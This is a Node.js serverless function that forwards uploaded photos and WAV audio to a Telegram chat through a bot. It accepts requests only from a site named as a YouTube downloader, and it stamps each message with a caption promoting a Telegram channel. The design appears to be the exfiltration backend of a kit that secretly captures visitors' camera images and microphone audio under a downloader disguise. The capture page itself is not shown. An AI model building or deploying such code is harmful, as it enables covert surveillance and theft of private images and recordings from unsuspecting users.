
const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');
const fs = require('fs');

const ALLOWED_ORIGIN = 'https://youtube-dow1.vercel.app'; 
const TOKEN = process.env.TOKEN;

module.exports = async (req, res) => {
  if (!TOKEN) {
    return res.status(500).json({ ok: false, error: 'Bot token not configured.' });
  }

  const origin = req.headers.origin;
  if (origin && origin !== ALLOWED_ORIGIN) {
    return res.status(403).json({ ok: false, error: 'Invalid origin' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(500).json({ ok: false, error: 'Failed to parse form.' });
    }

    const chatId = fields.chat_id;
    if (!chatId) {
      return res.status(400).json({ ok: false, error: 'chat_id is required.' });
    }

    try {
      if (files.photo) {
        const { filepath, mimetype, size } = files.photo;
        if (!filepath || !mimetype.startsWith('image/') || size > 20 * 1024 * 1024) {
          return res.status(400).json({ ok: false, error: 'Invalid or too large photo.' });
        }

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filepath), { filename: 'photo.jpg' });
        formData.append('caption', '⚡Join ➣ @Hekmat_King');

        const resPhoto = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const jsonPhoto = await resPhoto.json();
        if (!jsonPhoto.ok) throw new Error(jsonPhoto.description || 'Telegram photo error');
      }

      if (files.audio) {
        const { filepath, mimetype, size } = files.audio;
        if (!filepath || !mimetype.startsWith('audio/') || size > 50 * 1024 * 1024) {
          return res.status(400).json({ ok: false, error: 'Invalid or too large audio.' });
        }

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('audio', fs.createReadStream(filepath), { filename: 'audio.wav' });
        formData.append('caption', '⚡Join ➣ @Hekmat_King');

        const resAudio = await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
          method: 'POST',
          body: formData
        });

        const jsonAudio = await resAudio.json();
        if (!jsonAudio.ok) throw new Error(jsonAudio.description || 'Telegram audio error');
      }

      return res.status(200).json({ ok: true });
    } catch (error) {
      console.error('Send error:', error.message);
      return res.status(500).json({ ok: false, error: 'Sending failed: ' + error.message });
    }
  });
};
